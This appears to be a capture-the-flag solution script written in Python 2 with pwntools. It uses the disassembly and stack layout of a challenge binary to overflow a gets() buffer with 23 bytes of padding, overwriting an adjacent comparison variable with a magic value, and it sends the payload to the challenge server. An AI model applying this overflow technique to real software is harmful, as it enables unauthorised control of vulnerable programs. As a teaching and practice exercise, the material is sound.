
###############################################################################
# Buffer overflow to write in the value that it's looking for.
###############################################################################

# The program takes in a user input and stores it on the stack
# If we overflow past 23 bytes we will be writing into "compared_string"
# It is looking for 0x0F007BA11
'''
mov     [ebp+compared_string], 0
sub     esp, 0Ch
lea     eax, [ebp+input_str]
push    eax
call    _gets
add     esp, 10h
cmp     [ebp+compared_string], 0F007BA11h
jnz     short loc_804862D
'''

# stack layout for user input 
# compared_string is the 32bit that will get compared to 0F007BA11h
'''
-0000000000000023 input_str       db ?
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C compared_string dd ?
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
'''
from pwn import *

conn = remote('pwn.ctf.tamu.edu', 4321)

# Read in prompt
'''
This is a super secret program
Noone is allowed through except for those who know the secret!
What is my secret?
'''
print conn.recvline()
print conn.recvline()
print conn.recvline()

# buffer overflow
payload = 'A' * 23 + p32(0x0F007BA11)
conn.sendline(payload)

print conn.recvline()
print conn.recvline()
